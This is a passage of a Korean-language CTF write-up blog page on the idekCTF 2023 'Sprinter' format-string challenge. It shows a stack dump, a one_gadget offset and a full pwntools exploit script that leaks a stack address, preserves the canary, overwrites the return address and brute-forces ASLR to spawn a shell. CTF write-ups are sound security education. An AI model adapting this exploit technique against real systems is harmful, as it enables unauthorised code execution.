class="line">0x7ffd1f0d4bf0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c00: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c10: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c20: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c30: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c40: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c50: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c60: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c70: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c80: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4c90: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4ca0: 0x2020202020202020      0x2020202020202020</span><br><span class="line">0x7ffd1f0d4cb0: 0x4120202020202020      0xedc89128c0bcb700</span><br><span class="line">0x7ffd1f0d4cc0: 0xb020202020202020      0x00007f7855414141</span><br><span class="line">0x7ffd1f0d4cd0: 0x0000000000000000      0x00007f785518d083</span><br></pre></td></tr></table></figure>
+
+<p><code>ret</code>가 <code>0x00007f7855414141</code>로 잘 변조 되었다.</p>
+<img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 20.44.01.png" width=450/>
+<br>
+
+<p>이제 <code>one gadget</code>을 이용하여 exploit을 진행해보자.</p>
+<h3 id="3-offset-Brute-forcing"><a href="#3-offset-Brute-forcing" class="headerlink" title="3. offset Brute forcing"></a>3. offset Brute forcing</h3><p>사용할 <code>one gadget</code> 오프셋은 아래와 같다.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br></pre></td></tr></table></figure>
+
+<p><code>\x01\x3b\x0e</code> 를 사용할 것인데 하위 1.5바이트 말고는 <code>aslr</code> 때문에 오프셋이 랜덤이니까 1&#x2F;4096의 확률의 브루트포싱이 필요하다.</p>
+<h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># p = process(&#x27;vuln&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;sprinter.chal.idek.team&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>,timeout=<span class="number">10</span>)</span><br><span class="line">        stack_leak = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;stack_leak : <span class="subst">&#123;<span class="built_in">hex</span>(stack_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">        canary_addr = stack_leak + <span class="number">0x108</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">b&#x27;\x01\xfb\xff%5$261c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%4$c&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;%10$.7s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># rbp</span></span><br><span class="line">        payload += <span class="string">b&#x27;%8c&#x27;</span></span><br><span class="line">        <span class="comment"># ret</span></span><br><span class="line">        payload += <span class="string">b&#x27;%12$.3s%11$.5s&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># padding</span></span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * (<span class="number">0x26</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">        payload += <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">        payload += p64(canary_addr + <span class="number">1</span>)         <span class="comment"># 10</span></span><br><span class="line">        payload += p64(canary_addr + <span class="number">8</span>*<span class="number">4</span> + <span class="number">3</span>)   <span class="comment"># 11</span></span><br><span class="line">        payload += p64(stack_leak)              <span class="comment"># 12</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">repr</span>(</span><br><span class="line">            p.recvn(<span class="number">100</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        ))</span><br><span class="line">        p.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(ex)</span><br></pre></td></tr></table></figure>
+
+<br>
+<img src="/images/230117-idekctf2023-sprinter/Screenshot 2023-01-17 at 00.29.59.png" width=500/>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0-c"><span class="toc-number">2.1.</span> <span class="toc-text">0. $[]%[]c</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Canary-%EB%B3%B4%EC%A1%B4"><span class="toc-number">2.2.</span> <span class="toc-text">1. Canary 보존</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-ret%EB%A5%BC-%EB%8D%AE%EC%96%B4-%ED%9D%90%EB%A6%84-%EB%B3%80%EA%B2%BD%ED%95%98%EA%B8%B0"><span class="toc-number">2.3.</span> <span class="toc-text">2. ret를 덮어 흐름 변경하기</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-offset-Brute-forcing"><span class="toc-number">2.4.</span> <span class="toc-text">3. offset Brute forcing</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">3.</span> <span class="toc-text">Exploit Code</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230117-idekctf2023-sprinter/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&text=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&is_video=false&description=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ideck CTF 2023 - Sprinter (*FSB*)&body=Check out this article: https://jiravvit.github.io/230117-idekctf2023-sprinter/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&title=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230117-idekctf2023-sprinter/&name=ideck CTF 2023 - Sprinter (*FSB*)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230117-idekctf2023-sprinter/&t=ideck CTF 2023 - Sprinter (*FSB*)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022-2023
+    jir4vvit
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'jiravvit-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
